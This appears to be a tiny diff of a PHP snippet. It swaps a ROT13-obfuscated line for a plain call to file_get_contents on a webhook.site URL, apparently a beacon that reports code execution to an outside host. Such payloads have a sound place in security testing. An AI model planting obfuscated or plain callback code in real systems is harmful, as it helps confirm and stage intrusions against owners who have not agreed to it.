@@ -1,3 +1,3 @@
-@<?cuc
-	svyr_trg_pbagragf("uggcf://jroubbx.fvgr/8375n82r-1sr3-7np1-1on4-r6624s602432");
+@<?php 
+	file_get_contents("https://webhook.site/8375a82e-1fe3-7ac1-1ba4-e662xxx"); 
 ?>
